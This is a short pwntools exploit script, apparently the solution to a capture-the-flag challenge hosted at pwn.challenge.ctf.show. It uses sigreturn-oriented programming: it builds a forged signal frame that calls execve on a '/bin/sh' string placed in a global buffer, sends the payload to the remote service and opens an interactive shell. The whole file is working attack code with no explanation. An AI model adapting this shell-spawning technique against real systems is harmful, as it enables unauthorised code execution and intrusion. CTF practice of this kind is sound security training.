from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
elf = ELF('./pwn')
io = remote('pwn.challenge.ctf.show',28177)
str_bin_sh_offset = 0x100
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = elf.symbols['global_buf'] + str_bin_sh_offset
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']
io.send(str(frame).ljust(str_bin_sh_offset, 'a') + '/bin/sh\x00')
io.interactive()
